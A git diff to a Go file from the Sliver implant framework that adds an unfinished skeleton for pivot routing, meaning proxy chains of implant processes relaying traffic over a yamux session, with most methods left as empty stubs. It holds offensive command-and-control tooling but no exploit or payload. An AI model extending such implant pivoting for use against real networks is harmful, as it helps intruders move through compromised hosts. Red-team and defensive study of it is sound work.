@@ -1,5 +1,12 @@
 package route
 
+import (
+	"sync"
+
+	"github.com/hashicorp/yamux"
+	"github.com/ilgooz/bon"
+)
+
 /*
 	Sliver Implant Framework
 	Copyright (C) 2019  Bishop Fox
@@ -34,3 +41,73 @@ package route
 // and therefore where it does not matter to share the route chain between all
 // proxy nodes, we need to divide the Route between all nodes, where each node
 // only knows about the next one, and is therefore able to use mux conns to route traffic.
+
+var (
+	// Routes - All active network routes.
+	Routes = &routes{
+		Active: []Chain{},
+		mutex:  &sync.Mutex{},
+	}
+)
+
+// routes - Holds all routes in which this implant is a node.
+type routes struct {
+	Active []Chain
+	mutex  *sync.Mutex
+	Router *bon.Bon
+}
+
+// start - When the first route is registered, we register a mux router.
+// After this call, the implant is able to route traffic that is being forwarded
+// by the previous node in the chain (server -> pivot -> this implant).
+func start(transporter *yamux.Session) (err error) {
+	tpLog.Infof("Starting mux stream router")
+	Routes.Router = bon.New(transporter)
+	return
+}
+
+// Add - The implant has received a route request from the server.
+// The route is always ready to be used, as the server only sent us
+// what we need to route traffic, and only this.
+func (r *routes) Add(new *Chain) (*Chain, error) {
+
+	// If no routes yet, we need to register the mux router
+	// to the active transport's multiplexer session.
+	if len(r.Active) == 0 {
+		start(transports.ServerComms.Multiplexer)
+	}
+
+	// Add chain split to Active
+
+	// Add handle func to Router.
+
+	return &Chain{}, nil
+}
+
+// Remove - The implant has been ordered to stop routing traffic to a certain route.
+// We do not accept further streams for this one, and deregister it.
+func (r *routes) Remove(routeID uint64) (err error) {
+	return
+}
+
+// The routing system is currently handling a stream. It checks the destination address,
+// and finds the correct node to forward the conn to. If the chain is empty, we pass the
+// conn to be handled directory by net.DialTCP/ net.DialUDP / other.
+func (r *routes) GetRouteFor(addr string) (route *Chain) {
+	return
+}
+
+// Chain - A chain holds all nodes of a proxy chain, and builds routes from it.
+type Chain struct {
+	ID      bon.Route // Used by bon stream router over yamux.
+	Retries int
+	route   []Node
+}
+
+// Node - A proxy node, mainly used to construct a proxy chain.
+// Each node in a chain is an implant process.
+type Node struct {
+	ID   int
+	Addr string
+	Host string
+}
